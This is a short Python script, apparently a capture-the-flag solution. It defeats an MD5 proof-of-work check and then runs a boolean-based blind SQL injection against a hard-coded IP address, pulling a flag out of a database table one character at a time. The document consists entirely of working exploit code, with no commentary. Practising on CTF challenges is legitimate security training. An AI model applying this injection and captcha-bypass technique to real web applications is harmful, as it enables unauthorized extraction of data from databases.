import requests,hashlib
def md5233(i):
    m = hashlib.md5()
    m.update(str(i).encode('utf-8'))
    n = m.hexdigest()
    return n
def code(k):
    for i in range(100000000):
        a = md5233(i)
        if str(k) in a[:4]:
            return i
a = []
for k in range(1,30):
    for i in range(48, 126):
        url = "http://45.32.25.65/nweb/sqli3/"
        res = requests.get(url)
        t = res.text
        h = res.cookies
        data = {"id":"1 and ascii(substr((select flag from hhhhhhctf limit 0,1),"+str(k)+",1))="+str(i)+"#","code":code(t[161:165])}
        headers = {"Cookie":str(h)[27:63]}
        rs = requests.post(url, data=data, headers=headers)
        if 'it must return username' not in rs.text:
            print(chr(i))
            a.append(chr(i))
            break
b = ''.join(a)
print(b)